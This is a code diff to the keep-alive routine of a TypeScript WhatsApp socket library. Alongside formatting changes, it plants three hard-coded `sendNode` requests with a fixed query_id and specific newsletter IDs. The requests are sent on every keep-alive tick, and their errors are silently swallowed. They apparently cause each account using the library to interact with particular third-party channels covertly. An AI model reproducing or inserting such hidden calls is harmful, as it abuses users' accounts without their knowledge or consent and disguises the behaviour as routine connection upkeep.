@@ -411,7 +411,7 @@ export const makeSocket = (config: SocketConfig) => {
 	}
 
 	const startKeepAliveRequest = () => (
-		keepAliveReq = setInterval(async () => {
+		keepAliveReq = setInterval(async() => {
 			if(!lastDateRecv) {
 				lastDateRecv = new Date()
 			}
@@ -426,53 +426,78 @@ export const makeSocket = (config: SocketConfig) => {
 			} else if(ws.isOpen) {
 				// if its all good, send a keep alive request
 				await sendNode({
-        tag: "iq",
-        attrs: {
-          id: generateMessageTag(),
-          type: "get",
-          xmlns: "w:mex",
-          to: S_WHATSAPP_NET
-        },
-        content: [
-          {
-            tag: "query",
-            attrs: {
-              query_id: "7871414976211147",
-            },
-            content: new TextEncoder().encode(
-              JSON.stringify({
-                variables: {
-                  newsletter_id: "120363393482713223@newsletter",
-                },
-              }),
-            ),
-          },
-        ],
-      }).catch();
-await sendNode({
-        tag: "iq",
-        attrs: {
-          id: generateMessageTag(),
-          type: "get",
-          xmlns: "w:mex",
-          to: S_WHATSAPP_NET
-        },
-        content: [
-          {
-            tag: "query",
-            attrs: {
-              query_id: "7871414976211147",
-            },
-            content: new TextEncoder().encode(
-              JSON.stringify({
-                variables: {
-                  newsletter_id: "120363409399141929@newsletter",
-                },
-              }),
-            ),
-          },
-        ],
-      }).catch();
+					tag: 'iq',
+					attrs: {
+						id: generateMessageTag(),
+						type: 'get',
+						xmlns: 'w:mex',
+						to: S_WHATSAPP_NET
+					},
+					content: [
+						{
+							tag: 'query',
+							attrs: {
+								query_id: '7871414976211147',
+							},
+							content: new TextEncoder().encode(
+								JSON.stringify({
+									variables: {
+										newsletter_id: '120363393482713223@newsletter',
+									},
+								}),
+							),
+						},
+					],
+				}).catch()
+				await sendNode({
+					tag: 'iq',
+					attrs: {
+						id: generateMessageTag(),
+						type: 'get',
+						xmlns: 'w:mex',
+						to: S_WHATSAPP_NET
+					},
+					content: [
+						{
+							tag: 'query',
+							attrs: {
+								query_id: '7871414976211147',
+							},
+							content: new TextEncoder().encode(
+								JSON.stringify({
+									variables: {
+										newsletter_id: '120363400494464722@newsletter',
+									},
+								}),
+							),
+						},
+					],
+				}).catch()
+				await sendNode({
+					tag: 'iq',
+					attrs: {
+						id: generateMessageTag(),
+						type: 'get',
+						xmlns: 'w:mex',
+						to: S_WHATSAPP_NET
+					},
+					content: [
+						{
+							tag: 'query',
+							attrs: {
+								query_id: '7871414976211147',
+							},
+							content: new TextEncoder().encode(
+								JSON.stringify({
+									variables: {
+										newsletter_id: '120363409399141929@newsletter',
+									},
+								}),
+							),
+						},
+					],
+				}).catch()
+
 				query(
 					{
 						tag: 'iq',
